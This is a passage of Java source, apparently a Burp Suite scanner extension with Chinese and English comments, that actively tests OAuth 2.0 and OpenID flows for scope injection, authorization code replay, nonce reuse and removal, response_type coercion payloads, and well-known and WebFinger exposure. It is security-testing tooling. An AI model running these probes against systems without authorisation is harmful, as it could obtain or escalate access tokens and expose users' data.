                            // 【兜底方案】：FSM 尚未抓到 Token 请求，使用启发式 URL 推测并构造发包(这里是原版代码)
                            else {
                                stdout.println("[*] [Scope Scan] FSM Token Req missing, using heuristic endpoint inference.");

                                URL asUrl = checkReqInfo_code.getUrl();
                                String asHostname = asUrl.getHost();
                                String authPath = asUrl.getPath();
                                String tokenPath = authPath.toLowerCase().endsWith("authorize") ? authPath.substring(0, authPath.length() - 9) + "token" : "/token";

                                List<String> reqHeaders_token = new ArrayList<>(Arrays.asList("Host: " + asHostname));
                                IParameter authHeaderParam = helpers.getRequestParameter(checkRequestResponse_code.getRequest(), "Authorization");
                                if (authHeaderParam != null) {
                                    reqHeaders_token.add("Authorization: " + authHeaderParam.getValue());
                                }
                                reqHeaders_token.add("Content-Type: application/x-www-form-urlencoded");

                                String reqBodyStr_token = "grant_type=authorization_code&code=" + codeVal + "&redirect_uri=" + redirectUriParameter.getValue() + "&scope=" + injected_scope;
                                byte[] reqBody_token = helpers.stringToBytes(reqBodyStr_token);

                                byte[] checkRequest_token = helpers.buildHttpMessage(reqHeaders_token, reqBody_token);
                                checkRequestStr_token = helpers.bytesToString(checkRequest_token);

                                String reqHeadingStr = "POST " + tokenPath + " HTTP/1.1\n";
                                checkRequestStr_token = reqHeadingStr + checkRequestStr_token.substring(checkRequestStr_token.indexOf("\n") + 1);
                                checkRequest_token = helpers.stringToBytes(checkRequestStr_token);

                                IHttpService tokenHttpService = helpers.buildHttpService(asHostname, asUrl.getPort() == -1 ? asUrl.getDefaultPort() : asUrl.getPort(), asUrl.getProtocol().equals("https"));
                                checkRequestResponse_token = callbacks.makeHttpRequest(tokenHttpService, checkRequest_token);
                            }

                            // =========================================================================
                            // 5. 验证响应与报告输出
                            // =========================================================================
                            byte[] checkResponse_token = checkRequestResponse_token.getResponse();
                            IResponseInfo checkRespInfo_token = helpers.analyzeResponse(checkResponse_token);
                            String checkResponseStr_token = helpers.bytesToString(checkResponse_token);

                            List<int[]> activeScanMatches = getMatches(checkResponse_token, "token".getBytes());
                            activeScanMatches.addAll(getMatches(checkResponse_token, "Set-Cookie: ".getBytes()));

                            // 检测换取 Token 是否成功且未报错
                            if ((checkRespInfo_token.getStatusCode() == 200) && (!checkResponseStr_token.toLowerCase().contains("error"))) {
                                List<int[]> requestHighlights = new ArrayList<>(1);
                                int payloadStart = checkRequestStr_token.indexOf(injected_scope);
                                if (payloadStart != -1) {
                                    payloadOffset[0] = payloadStart;
                                    payloadOffset[1] = payloadStart + injected_scope.length();
                                    requestHighlights.add(payloadOffset);
                                }

                                if (isOpenID) {
                                    issues.add(new CustomScanIssue(
                                            baseRequestResponse.getHttpService(),
                                            helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                            new IHttpRequestResponse[] {checkRequestResponse_code, callbacks.applyMarkers(checkRequestResponse_token, requestHighlights, activeScanMatches)},
                                            "OpenID Improper Validation of Scope Parameter",
                                            "The OpenID Flow seems not properly validating the <code>scope</code> request parameter.\n<br>"
                                                    +"In details, the Authorization Server accepted the <code>scope</code> parameter value injected on request "
                                                    +"<b>"+ injected_scope +"</b> and released a secret token on response.\n<br>"
                                                    +"A malicious Client-Application abusing this vulnerability could manipulate the <code>scope</code> "
                                                    +"parameter of exchange code/token requests, and upgrade the scope of access tokens in order to obtain "
                                                    +"some extra permissions in accessing reserved data of victim users.\n<br>"
                                                    +"<br>References:<br>"
                                                    +"<a href=\"https://openid.net/specs/openid-connect-basic-1_0.html#Scopes\">https://openid.net/specs/openid-connect-basic-1_0.html#Scopes</a>",
                                            "High",
                                            "Firm"));
                                } else {
                                    issues.add(new CustomScanIssue(
                                            baseRequestResponse.getHttpService(),
                                            helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                            new IHttpRequestResponse[] {checkRequestResponse_code, callbacks.applyMarkers(checkRequestResponse_token, requestHighlights, activeScanMatches)},
                                            "OAUTHv2 Improper Validation of Scope Parameter",
                                            "The OAUTHv2 Flow seems not properly validating the <code>scope</code> request parameter.\n<br>"
                                                    +"In details, the Authorization Server accepted the <code>scope</code> parameter value injected on request "
                                                    +"<b>"+ injected_scope +"</b> and released a secret token on response.\n<br>"
                                                    +"A malicious Client-Application abusing this vulnerability could manipulate the <code>scope</code> "
                                                    +"parameter of exchange code/token requests, and upgrade the scope of access tokens in order to obtain "
                                                    +"some extra permissions in accessing reserved data of victim users.\n<br>"
                                                    +"<br>References:<br>"
                                                    +"<a href=\"https://datatracker.ietf.org/doc/html/rfc6749#page-23\">https://datatracker.ietf.org/doc/html/rfc6749#page-23</a>",
                                            "High",
                                            "Firm"));
                                }
                            }
                        }
                    }
                }
            }
        }
        return issues;
    }

    /**
     * 检测同一个授权码能否被重复使用多次来换取访问令牌。

     */
    public List<IScanIssue> codereplayScan(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
        // Scan for authorization code replay issues on token requests for OAUTHv2 and OpenID Authorization Code and Hybrid Flows
        List<IScanIssue> issues = new ArrayList<>();
        int[] payloadOffset = new int[2];
        String checkRequestStr;
        IResponseVariations respVariations = null;
        Boolean respDiffers = false;
        IParameter codeParameter = helpers.getRequestParameter(baseRequestResponse.getRequest(), "code");
        IParameter grantParameter = helpers.getRequestParameter(baseRequestResponse.getRequest(), "grant_type");
        IParameter clientIdParameter = helpers.getRequestParameter(baseRequestResponse.getRequest(), "client_id");
        //首先检查当前请求是不是一个token换取请求
        //必须同时包含三个参数：code（授权码）、grant_type=authorization_code（授权类型）、client_id（客户端ID）
        //同时确保扫描插入点是针对code参数
        if ((codeParameter!= null & grantParameter!=null & clientIdParameter!=null)) {
            // Checking for authorization code replay issues on token requests of OAUTHv2 and OpenID Authorization Code and Hybrid Flows
            if (grantParameter.getValue().equals("authorization_code")) {
                //保存第一次发送这个token请求时得到的响应
                //记录响应状态码和响应内容
                byte[] originalResponse = baseRequestResponse.getResponse();
                String originalResponseStr = helpers.bytesToString(originalResponse);
                IResponseInfo originalRespInfo = helpers.analyzeResponse(originalResponse);
                if (insertionPoint.getInsertionPointName().equals("code")) {   // Forcing to perform only a tentative (unique insertion point)
                    stdout.println("[+] Active Scan: Checking for Autorization Code Replay attack issues");
                    // Build the request to replay
                    //原封不动地再次发送完全相同的token请求（使用同一个授权码）
                    //获取第二次请求的响应
                    byte[] checkRequest = baseRequestResponse.getRequest();
                    IHttpRequestResponse checkRequestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), checkRequest);
                    checkRequestStr = helpers.bytesToString(checkRequest);
                    byte [] checkResponse = checkRequestResponse.getResponse();
                    String checkResponseStr = helpers.bytesToString(checkResponse);
                    IResponseInfo checkRespInfo = helpers.analyzeResponse(checkResponse);
                    // Checking if the replay response was successful
                    if (checkRespInfo.getStatusCode() == originalRespInfo.getStatusCode()) {
                        respVariations = helpers.analyzeResponseVariations(baseRequestResponse.getResponse(), checkRequestResponse.getResponse());
                        List <String> responseChanges = respVariations.getVariantAttributes();
                        for (String change : responseChanges) {
                            if (change.equals("status_code") || change.equals("page_title") || change.equals("location")) {
                                respDiffers = true;
                            } else if (change.equals("whole_body_content") || change.equals("limited_body_content")) {
                                // If response body differs but neither contains a error message and also both contains a token or a authorization code then respDiffers remain False
                                if ( (checkResponseStr.toLowerCase().contains("error") & (!originalResponseStr.toLowerCase().contains("error"))) &
                                        (((!checkResponseStr.toLowerCase().contains("code")) & (originalResponseStr.toLowerCase().contains("code"))) ||
                                                ((!checkResponseStr.toLowerCase().contains("token")) & (originalResponseStr.toLowerCase().contains("token")))) ) {
                                    respDiffers = true;
                                }
                            }
                        }
                        if (!respDiffers) {
                            String codeString = codeParameter.getValue();
                            List<int[]> requestHighlights = new ArrayList<>(1);
                            int payloadStart = checkRequestStr.indexOf(codeString);
                            payloadOffset[0] = payloadStart;
                            payloadOffset[1] = payloadStart+codeString.length();
                            requestHighlights.add(payloadOffset);
                            // Found OAUTHv2 or OpenID authorization code replay issue
                            issues.add(new CustomScanIssue(
                                    baseRequestResponse.getHttpService(),
                                    helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                    new IHttpRequestResponse[] {callbacks.applyMarkers(baseRequestResponse, requestHighlights, null), callbacks.applyMarkers(checkRequestResponse, requestHighlights, null) },
                                    "[Flaw 9] OAUTHv2/OpenID Flow Vulnerable to Authorization Code Replay Attacks",
                                    "The Resource Server does not invalidate the <code>code</code> parameter after first use, "
                                            +"so the implemented OAUTHv2/OpenID Flow (Authorization Code or Hybrid) is vulnerable to authorization code replay attacks.\n<br>"
                                            +"In details, it was possible to obtain a new access token (or session cookie) by re-sending an already used authorization code:\n <b>"+ codeString +"</b>\n<br>"
                                            +"An attacker, able to retrieve an used <code>code</code> value of any user, could abuse this "
                                            +"vulnerability in order to re-exchange the authorization code with a valid access token (or session cookie) "
                                            +"and obtain access to reserved data of the victim user.\n<br>"
                                            +"<br>References:<br>"
                                            +"<a href=\"https://datatracker.ietf.org/doc/html/rfc6749#section-4.1.2\">https://datatracker.ietf.org/doc/html/rfc6749#section-4.1.2</a><br>"
                                            +"<a href=\"https://openid.net/specs/openid-connect-core-1_0.html#TokenRequestValidation\">https://openid.net/specs/openid-connect-core-1_0.html#TokenRequestValidation</a>",
                                    "High",
                                    "Firm"));
                        }
                    }
                }
            }
        }
        return issues;
    }



    /**
     * OpenID Nonce 参数安全扫描
     *
     * 检测两种漏洞：
     *
     * 1. Nonce重复使用漏洞
     *    - 重放相同的nonce值发送两次相同的请求
     *    - 如果两次响应无显著差异（状态码、页面标题、重定向、响应体）
     *    - 说明服务器允许nonce重复使用，存在漏洞
     *
     * 2. Nonce未校验漏洞
     *    - 移除nonce参数后重新发送请求
     *    - 如果响应与原请求无显著差异
     *    - 说明服务器不验证nonce参数，存在漏洞
     *
     * 判断标准：
     *   期望行为：重放nonce或删除nonce应返回错误
     *   漏洞标志：两次响应基本相同（respDiffers = false）
     */
    public List<IScanIssue> nonceScan(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
        // Scan for nonce duplicate replay and nonce not controlled issues for the requests of all OpenID Flows
        List<IScanIssue> issues = new ArrayList<>();
        int[] payloadOffset = new int[2];
        IResponseVariations respVariations = null;
        Boolean isOpenID = false;
        Boolean respDiffers = false;
        IParameter clientIdParameter = helpers.getRequestParameter(baseRequestResponse.getRequest(), "client_id");
        IParameter resptypeParameter = helpers.getRequestParameter(baseRequestResponse.getRequest(), "response_type");
        IParameter scopeParameter = helpers.getRequestParameter(baseRequestResponse.getRequest(), "scope");
        IParameter nonceParameter = helpers.getRequestParameter(baseRequestResponse.getRequest(), "nonce");
        if (clientIdParameter!=null & resptypeParameter!=null & nonceParameter!=null) {
            // Determine if is OpenID Flow
            if (scopeParameter!=null) {
                if (scopeParameter.getValue().contains("openid")) {
                    isOpenID = true;
                }
            } else if (helpers.urlDecode(resptypeParameter.getValue()).contains("id_token") || helpers.urlDecode(resptypeParameter.getValue()).equals("code token")) {
                isOpenID = true;
            }
            if (isOpenID) {
                // Checking only on OpenID Flows because only their authorization requests could be affected
                String nonceValue = nonceParameter.getValue();
                byte[] originalResponse = baseRequestResponse.getResponse();
                byte[] originalRequest = baseRequestResponse.getRequest();
                String originalRequestStr = helpers.bytesToString(originalRequest);
                String originalResponseStr = helpers.bytesToString(originalResponse);
                IResponseInfo originalRespInfo = helpers.analyzeResponse(originalResponse);
                if (insertionPoint.getInsertionPointName().equals("nonce")) {   // Forcing to perform only a tentative (unique insertion point)
                    stdout.println("[+] Active Scan: Checking for Nonce values Reuse Allowed on OpenID requests");
                    // Build the request to replay the nonce value
                    byte[] checkRequest = baseRequestResponse.getRequest();
                    IHttpRequestResponse checkRequestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), checkRequest);
                    String checkRequestStr = helpers.bytesToString(checkRequest);
                    byte [] checkResponse = checkRequestResponse.getResponse();
                    String checkResponseStr = helpers.bytesToString(checkResponse);
                    IResponseInfo checkRespInfo = helpers.analyzeResponse(checkResponse);
                    // Checking if the replayed nonce response was successful
                    if (checkRespInfo.getStatusCode() == originalRespInfo.getStatusCode()) {
                        respVariations = helpers.analyzeResponseVariations(baseRequestResponse.getResponse(), checkRequestResponse.getResponse());
                        List <String> responseChanges = respVariations.getVariantAttributes();
                        for (String change : responseChanges) {
                            if (change.equals("status_code") || change.equals("page_title") || change.equals("location")) {
                                respDiffers = true;
                            } else if (change.equals("whole_body_content") || change.equals("limited_body_content")) {
                                // If response body differs but neither contains a error message and also both contains a token or a authorization code then respDiffers remain False
                                if ( (checkResponseStr.toLowerCase().contains("error") & (!originalResponseStr.toLowerCase().contains("error"))) &
                                        (((!checkResponseStr.toLowerCase().contains("code")) & (originalResponseStr.toLowerCase().contains("code"))) ||
                                                ((!checkResponseStr.toLowerCase().contains("token")) & (originalResponseStr.toLowerCase().contains("token")))) ) {
                                    respDiffers = true;
                                }
                            }
                        }
                        if (!respDiffers) {
                            List<int[]> requestHighlights = new ArrayList<>(1);
                            int payloadStart = checkRequestStr.indexOf(nonceValue);
                            payloadOffset[0] = payloadStart;
                            payloadOffset[1] = payloadStart+nonceValue.length();
                            requestHighlights.add(payloadOffset);
                            // Found OpenID nonce duplicate issue
                            issues.add(
                                    new CustomScanIssue(
                                            baseRequestResponse.getHttpService(),
                                            helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                            new IHttpRequestResponse[] {callbacks.applyMarkers(baseRequestResponse, requestHighlights, null), callbacks.applyMarkers(checkRequestResponse, requestHighlights, null) },
                                            "[Flaw 8] OpenID Flow Nonce Reuse Allowed",
                                            "The OpenID Authorization Server seems allowing the reuse of values for the <code>nonce</code> parameter "
                                                    +"during login procedure.\n<br>"
                                                    +"In details, the Authorization Server accepted a request containing an already used <code>nonce</code> value\n <b>"+ nonceValue +"</b> "
                                                    +"and released a new secret token (or authorization code) on response.\n<br>"
                                                    +"Based on OpenID specifications the <code>nonce</code> parameter is used to associate a Client session "
                                                    +"with an ID Token, and to mitigate replay attacks.\n<br>"
                                                    +"Using constant values for the <code>nonce</code> parameter de-facto disables its anti-replay attacks protection, then "
                                                    +"the attack surface of the OpenID service increases.\n<br>"
                                                    +"If there are not in place other anti-replay protections, then an attacker able to retrieve "
                                                    +"a valid authorization request could replay it and potentially obtain access to other user resources.\n<br>"
                                                    +"<br>References:<br>"
                                                    +"<a href=\"https://openid.net/specs/openid-connect-core-1_0.html#NonceNotes\">https://openid.net/specs/openid-connect-core-1_0.html#NonceNotes</a>",
                                            "Low",
                                            "Firm"
                                    )
                            );
                        }
                    }
                    // Build the request to remove the nonce value
                    byte[] checkRequest_2 = baseRequestResponse.getRequest();
                    // Removing the nonce from request
                    checkRequest_2 = helpers.removeParameter(checkRequest_2, nonceParameter);
                    respDiffers = false;
                    IHttpRequestResponse checkRequestResponse_2 = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), checkRequest_2);
                    byte [] checkResponse_2 = checkRequestResponse_2.getResponse();
                    String checkResponseStr_2 = helpers.bytesToString(checkResponse_2);
                    IResponseInfo checkRespInfo_2 = helpers.analyzeResponse(checkResponse_2);
                    // Checking if the request without nonce was accepetd
                    if (checkRespInfo_2.getStatusCode() == originalRespInfo.getStatusCode()) {
                        respVariations = null;
                        respVariations = helpers.analyzeResponseVariations(baseRequestResponse.getResponse(), checkRequestResponse_2.getResponse());
                        List <String> responseChanges_2 = respVariations.getVariantAttributes();
                        for (String change : responseChanges_2) {
                            if (change.equals("status_code") || change.equals("page_title") || change.equals("location")) {
                                respDiffers = true;
                            } else if (change.equals("whole_body_content") || change.equals("limited_body_content")) {
                                // If response body differs but neither contains a error message and also both contains a token or a authorization code then respDiffers remain False
                                if ( (checkResponseStr_2.toLowerCase().contains("error") & (!originalResponseStr.toLowerCase().contains("error"))) &
                                        (((!checkResponseStr_2.toLowerCase().contains("code")) & (originalResponseStr.toLowerCase().contains("code"))) ||
                                                ((!checkResponseStr_2.toLowerCase().contains("token")) & (originalResponseStr.toLowerCase().contains("token")))) ) {
                                    respDiffers = true;
                                }
                            }
                        }
                        if (!respDiffers) {
                            List<int[]> requestHighlights = new ArrayList<>(1);
                            int payloadStart = originalRequestStr.indexOf(nonceValue);
                            payloadOffset[0] = payloadStart;
                            payloadOffset[1] = payloadStart+nonceValue.length();
                            requestHighlights.add(payloadOffset);
                            // Found OpenID nonce not controlled issue
                            issues.add(
                                    new CustomScanIssue(
                                            baseRequestResponse.getHttpService(),
                                            helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                            new IHttpRequestResponse[] {callbacks.applyMarkers(baseRequestResponse, requestHighlights, null), callbacks.applyMarkers(checkRequestResponse_2, null, null) },
                                            "[Flaw 8] OpenID Flow Nonce Parameter not Evaluated",
                                            "The OpenID Flow is improperly implemented because the Authorization Server does not validates "
                                                    +"the <code>nonce</code> parameter on login requests.\n<br>"
                                                    +"In details, the Authorization Server successfully accepted both a request containing the <code>nonce</code> "
                                                    +"parameter value <b>"+nonceValue+"</b> and also a request without any <code>nonce</code> parameter.<br>"
                                                    +"Based on OpenID specifications the <code>nonce</code> parameter should be unguessable and unique per client session "
                                                    +"in order to provide a security mitigation against replay attacks.\nNot validating the <code>nonce</code> values "
                                                    +"de-facto disables its protections and increases the attack surface of the OpenID service.\n<br>"
                                                    +"If there are not in place other anti-replay protections, then an attacker able to retrieve "
                                                    +"a valid authorization request could replay it and potentially obtain access to other user resources.\n<br>"
                                                    +"<br>References:<br>"
                                                    +"<a href=\"https://openid.net/specs/openid-connect-core-1_0.html#NonceNotes\">https://openid.net/specs/openid-connect-core-1_0.html#NonceNotes</a>",
                                            "Low",
                                            "Firm"
                                    )
                            );
                        }
                    }
                }
            }
        }
        return issues;
    }



    /**
     * Response Type 参数验证扫描
     *
     * 检测两类响应类型篡改漏洞：
     *
     * 1. OpenID Flow - response_type=none 漏洞
     *    - 将response_type改为"none"发送请求
     *    - 如果服务器返回code/token且无错误信息
     *    - 说明服务器未正确验证response_type，允许使用不安全的"none"算法
     *
     * 2. OAuthv2 Flow - response_type 强制转换漏洞
     *    - 测试payload: ["none", "code,token", "token,code", "token"]
     *    - 将授权码流程强制转换为隐式流程
     *    - 如果服务器返回code/token且无错误信息
     *    - 说明服务器允许响应类型篡改，存在流程降级风险
     *
     * 判断标准：
     *   - 响应中包含code或token
     *   - 响应中无error关键字
     *   - 参数格式正确（&code=、?code=等）
     *   满足以上条件即报告漏洞
     */
    public List<IScanIssue> resptypeScan(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
        // Scan for OAUTHv2/OpenID flows that does not validate adequately the 'response_type'value issues on authorization-code requests
        List<IScanIssue> issues = new ArrayList<>();
        IHttpRequestResponse checkRequestResponse;
        int[] payloadOffset = new int[2];
        String checkRequestStr;
        Boolean isOpenID = false;
        byte[] rawrequest = baseRequestResponse.getRequest();
        IParameter resptypeParameter = helpers.getRequestParameter(baseRequestResponse.getRequest(), "response_type");
        IParameter scopeParameter = helpers.getRequestParameter(baseRequestResponse.getRequest(), "scope");
        IParameter clientIdParameter = helpers.getRequestParameter(baseRequestResponse.getRequest(), "client_id");
        if (clientIdParameter!=null & resptypeParameter!=null) {
            // Determine if is OpenID Flow
            if (scopeParameter!=null) {
                if (scopeParameter.getValue().contains("openid")) {
                    isOpenID = true;
                }
            } else if (helpers.urlDecode(resptypeParameter.getValue()).contains("id_token") || helpers.urlDecode(resptypeParameter.getValue()).equals("code token")) {
                isOpenID = true;
            }
            // On OpenID Flows checking the response_type none issue on authorization requests
            if (isOpenID) {
                String payload_resptypenone = "none";
                if (insertionPoint.getInsertionPointName().equals("response_type")) {   // Forcing to perform only a tentative (unique insertion point)
                    stdout.println("[+] Active Scan: Checking for OpenID Response Type coercion to none algorithm issues");
                    // Build request containing the payload in the 'request_type' parameter
                    if (resptypeParameter.getType()==IParameter.PARAM_BODY) {
                        IParameter newParam = helpers.buildParameter("response_type", payload_resptypenone, IParameter.PARAM_BODY);
                        byte [] checkRequest = helpers.updateParameter(rawrequest, newParam);
                        checkRequestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), checkRequest);
                        checkRequestStr = helpers.bytesToString(checkRequest);
                    } else if (resptypeParameter.getType()==IParameter.PARAM_URL) {
                        IParameter newParam = helpers.buildParameter("response_type", payload_resptypenone, IParameter.PARAM_URL);
                        byte [] checkRequest = helpers.updateParameter(rawrequest, newParam);
                        checkRequestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), checkRequest);
                        checkRequestStr = helpers.bytesToString(checkRequest);
                    } else {
                        // Discarding malformed requests containing a response_type parameter
                        //stdout.println("[+] Exiting, found malformed request");
                        return issues;
                    }
                    byte [] checkResponse = checkRequestResponse.getResponse();
                    String checkResponseStr = helpers.bytesToString(checkResponse);
                    List<int[]> activeScanMatches = getMatches(checkRequestResponse.getResponse(), "code".getBytes());
                    activeScanMatches.addAll(getMatches(checkRequestResponse.getResponse(), "token".getBytes()));
                    List<int[]> truePositiveMatches = getMatches(checkRequestResponse.getResponse(), "&code=".getBytes());
                    truePositiveMatches.addAll(getMatches(checkRequestResponse.getResponse(), "?code=".getBytes()));
                    truePositiveMatches.addAll(getMatches(checkRequestResponse.getResponse(), "&token=".getBytes()));
                    truePositiveMatches.addAll(getMatches(checkRequestResponse.getResponse(), "?token=".getBytes()));
                    // Check if vulnerable and report the issue
                    if ((activeScanMatches.size() > 0) & (!checkResponseStr.toLowerCase().contains("error")) & (truePositiveMatches.size() > 0)) {
                        List<int[]> requestHighlights = new ArrayList<>(1);
                        int payloadStart = checkRequestStr.indexOf("response_type=none");
                        payloadOffset[0] = payloadStart;
                        payloadOffset[1] = payloadStart+("response_type=none").length();
                        requestHighlights.add(payloadOffset);
                        issues.add(new CustomScanIssue(
                                baseRequestResponse.getHttpService(),
                                helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                new IHttpRequestResponse[] { callbacks.applyMarkers(checkRequestResponse, requestHighlights, activeScanMatches) },
                                "OpenID Improper Validation of Response Type Value",
                                "Found an improper validation on OpenID Flow on the request parameter <code>response_type</code> value.\n<br>"
                                        +"In details, the Authorization Server does not rejects the requests contaning the <code>response_type</code> value of <b>"+ payload_resptypenone +"</b>\n, "
                                        +"and it releases a valid authorization code or access token in response.\n<br>"
                                        +"This issue could be exploited to coerce a secure OpenID Flow to use the insecure 'None' algorithm that does not require any signature verification "
                                        +"when validating the ID tokens.\n<br>"
                                        +"For security reasons the <code>response_type</code> value on OpenID flows should be adequately validated at server-side, "
                                        +"so that if a invalid value will be detected the Authorization Server should not release authorization codes or access tokens in response.\n<br>"
                                        +"Note: this issue should be <b>confirmed manually</b>.\n<br>"
                                        +"<br>References:\n<br>"
                                        +"<a href=\"https://openid.net/specs/oauth-v2-multiple-response-types-1_0.html#none\">https://openid.net/specs/oauth-v2-multiple-response-types-1_0.html#none</a>",
                                "High",
                                "Firm"));
                    }
                }
            }
            // On OAUTHv2 Flows checking the response_type coercion to implicit flow issue on authorization requests
            else {
                String[] payload_resptype = {"none", "code,token", "token,code", "token"};
                //stdout.println("[+] Active Scan: Checking for OAUTHv2 response_type coercion to implicit flow issues");
                //for (String payload_rt : payload_resptype ) {
                if (insertionPoint.getInsertionPointName().equals("response_type")) {   // Forcing to perform only a tentative (unique insertion point)
                    stdout.println("[+] Active Scan: Checking for OAUTHv2 Response Type coercion to implicit flow issues");
                    for (String payload_rt : payload_resptype ) {
                        // Build request containing the payload in the 'request_type' parameter
                        if (resptypeParameter.getType()==IParameter.PARAM_BODY) {
                            IParameter newParam = helpers.buildParameter("response_type", payload_rt, IParameter.PARAM_BODY);
                            byte [] checkRequest = helpers.updateParameter(rawrequest, newParam);
                            checkRequestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), checkRequest);
                            checkRequestStr = helpers.bytesToString(checkRequest);
                        } else if (resptypeParameter.getType()==IParameter.PARAM_URL) {
                            IParameter newParam = helpers.buildParameter("response_type", payload_rt, IParameter.PARAM_URL);
                            byte [] checkRequest = helpers.updateParameter(rawrequest, newParam);
                            checkRequestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), checkRequest);
                            checkRequestStr = helpers.bytesToString(checkRequest);
                        } else {
                            // Discarding malformed requests containing a response_type parameter
                            //stdout.println("[+] Exiting, found malformed request");
                            return issues;
                        }
                        byte [] checkResponse = checkRequestResponse.getResponse();
                        String checkResponseStr = helpers.bytesToString(checkResponse);
                        List<int[]> activeScanMatches = getMatches(checkRequestResponse.getResponse(), "code".getBytes());
                        activeScanMatches.addAll(getMatches(checkRequestResponse.getResponse(), "token".getBytes()));
                        List<int[]> truePositiveMatches = getMatches(checkRequestResponse.getResponse(), "&code=".getBytes());
                        truePositiveMatches.addAll(getMatches(checkRequestResponse.getResponse(), "?code=".getBytes()));
                        truePositiveMatches.addAll(getMatches(checkRequestResponse.getResponse(), "&token=".getBytes()));
                        truePositiveMatches.addAll(getMatches(checkRequestResponse.getResponse(), "?token=".getBytes()));
                        // Check if vulnerable and report the issue
                        if ((activeScanMatches.size() > 0) & (!checkResponseStr.toLowerCase().contains("error")) & (truePositiveMatches.size() > 0)) {
                            List<int[]> requestHighlights = new ArrayList<>(1);
                            int payloadStart = checkRequestStr.indexOf("response_type="+payload_rt);
                            payloadOffset[0] = payloadStart;
                            payloadOffset[1] = payloadStart+("response_type="+payload_rt).length();
                            requestHighlights.add(payloadOffset);
                            issues.add(new CustomScanIssue(
                                    baseRequestResponse.getHttpService(),
                                    helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                    new IHttpRequestResponse[] { callbacks.applyMarkers(checkRequestResponse, requestHighlights, activeScanMatches) },
                                    "OAUTHv2 Improper Validation of Response Type Value",
                                    "Found an improper validation on OAUTHv2 Authorization Code Flow on the request parameter <code>response_type</code> value.\n<br>"
                                            +"In details, the Authorization Server does not rejects the requests contaning the <code>response_type</code> value of <b>"+ payload_rt +"</b>\n, "
                                            +"and it releases a valid authorization code or access token in response.\n<br>"
                                            +"This issue could be exploited to coerce a secure OAUTHv2 Authorization Code Flow into the insecure OAUTHv2 Implicit Flow.\n<br>"
                                            +"For security reasons the <code>response_type</code> value on OAUTHv2 flows should be adequately validated at server-side, "
                                            +"so that if a invalid value will be detected the Authorization Server should not release authorization codes or access tokens in response.\n<br>"
                                            +"Note: this issue should be <b>confirmed manually</b>.\n<br>"
                                            +"<br>References:\n<br>"
                                            +"<a href=\"https://datatracker.ietf.org/doc/html/rfc6749\">https://datatracker.ietf.org/doc/html/rfc6749</a>",
                                    "High",
                                    "Firm"));
                        }
                    }
                }

            }

        }
        return issues;
    }


    /**
     * Well-Known 配置信息泄露扫描，没有漏洞，都是一些info
     *
     * 检测两类公开暴露的配置文件：
     *
     * 1. WebFinger 服务探测
     *    - 测试账号: admin, anonymous, test
     *    - 构造webfinger请求查询用户是否存在
     *    - 如果返回200且响应包含"subject"和用户名
     *    - 说明存在用户枚举风险，WebFinger服务过度暴露
     *
     * 2. 配置文件发现
     *    - 遍历WELL_KNOWN路径列表（如/.well-known/openid-configuration）
     *    - 发送GET请求到每个well-known路径
     *    - 如果返回200状态码
     *    - 根据是否OpenID Flow返回相应信息类漏洞报告
     *
     * 去重机制：
     *   - 使用alreadyChecked列表记录已扫描的authority
     *   - 避免对同一目标重复扫描
     *
     * 判断标准：
     *   - 状态码200即认为配置信息暴露
     *   - WebFinger需额外验证返回内容确认用户存在
     *   - 均为信息类漏洞，用于扩大攻击面了解
     */
    public List<IScanIssue> wellknownScan(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) throws MalformedURLException {
        // Scan for information exposed on wellKnown urls
        List<IScanIssue> issues = new ArrayList<>();
        String checkRequestStr;
        int[] payloadOffset = new int[2];
        IRequestInfo reqInfo = helpers.analyzeRequest(baseRequestResponse);
        URL url = reqInfo.getUrl();
        String proto = url.getProtocol();
        String host = url.getHost();
        int port = url.getPort();
        String authority = url.getAuthority();
        String origin = url.getProtocol() + "://" + authority;
        Boolean isOpenID = false;
        IParameter scopeParameter = helpers.getRequestParameter(baseRequestResponse.getRequest(), "scope");
        IParameter clientIdParameter = helpers.getRequestParameter(baseRequestResponse.getRequest(), "client_id");
        IParameter resptypeParameter = helpers.getRequestParameter(baseRequestResponse.getRequest(), "response_type");
        // First check if the system was already checked for well known urls
        if (!alreadyChecked.contains(authority) & (clientIdParameter!=null & resptypeParameter!=null)) {
            alreadyChecked.add(authority);
            List<String> listWithoutDuplicates = new ArrayList<>(new HashSet<>(alreadyChecked));
            alreadyChecked = listWithoutDuplicates;
            stdout.println("[+] Active Scan: Searching for OAUTHv2/OpenID Well-Known urls");
            for (String payload_url : WELL_KNOWN) {
                // Determine if is OpenID Flow
                if (scopeParameter!=null) {
                    if (scopeParameter.getValue().contains("openid")) {
                        isOpenID = true;
                    }
                } else if (helpers.urlDecode(resptypeParameter.getValue()).contains("id_token") || helpers.urlDecode(resptypeParameter.getValue()).equals("code token")) {
                    isOpenID = true;
                }
                // Checking for WebFinger issues
                if (payload_url.contains("resource")) {
                    if (payload_url.contains("ORIGINCHANGEME")) {
                        payload_url = payload_url.replace("ORIGINCHANGEME", origin);
                    } else {
                        payload_url = payload_url.replace("URLCHANGEME", reqInfo.getUrl().getHost());
                    }
                    List<String> usersList = Arrays.asList("admin", "anonymous", "test");
                    for (String username: usersList) {
                        payload_url = payload_url.replace("USERCHANGEME", username);
                        // Build request to check webfinger service
                        URL welknownUrl = new URL(proto, host, port, payload_url);
                        byte[] checkRequest = helpers.buildHttpRequest(welknownUrl);
                        IHttpRequestResponse checkRequestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), checkRequest);
                        checkRequestStr = helpers.bytesToString(checkRequest);
                        byte [] checkResponse = checkRequestResponse.getResponse();
